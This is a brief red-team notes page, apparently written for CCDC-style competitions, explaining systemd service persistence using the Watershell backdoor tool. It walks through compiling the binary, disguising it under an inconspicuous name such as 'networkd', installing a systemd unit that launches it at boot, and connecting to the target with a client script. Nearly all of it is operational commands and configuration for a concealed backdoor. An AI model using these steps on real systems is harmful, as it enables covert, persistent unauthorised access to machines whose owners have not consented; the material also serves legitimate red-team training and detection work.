---
description: Systemd Service Persistence using Watershell as an example.
---

# Systemd Service Persistence

[Watershell ](https://github.com/RITRedteam/watershell-cpp)is an incredible script that I came across from a fellow red teamer during CCDC Regionals. I highly recommend reading the [original GitHub](https://github.com/wumb0/watershell) to learn more about the tool and why I fell in love with it.&#x20;

General steps for persistence with Watershell:

1. Compile the binary:&#x20;

```bash
g++ main.cpp watershell.cpp -o ${INSERT_BINARY_NAME}
```

2\. Note: You can edit the default port that the binary uses in the main.cpp and watershell.cpp files prior to comilation.

3\. Transfer the binary to the targets system, I recommend naming the binary something inconspicuous such as `networkd` or `ipv6_conf`

4\. Setup a service to execute the binary, the following demonstrates an example configuration:

```bash
[Unit]
Description=persistence

[Service]
Type=simple
ExecStart=/bin/networkd

[Install]
WantedBy=multi-user.target
```

1. Connect to the target using `watershell-cli.py` using the following command:\
   `python3 watershell-cli.py -t [IP] -p [PORT]`

### References

{% embed url="https://redcanary.com/blog/attck-t1501-understanding-systemd-service-persistence" %}
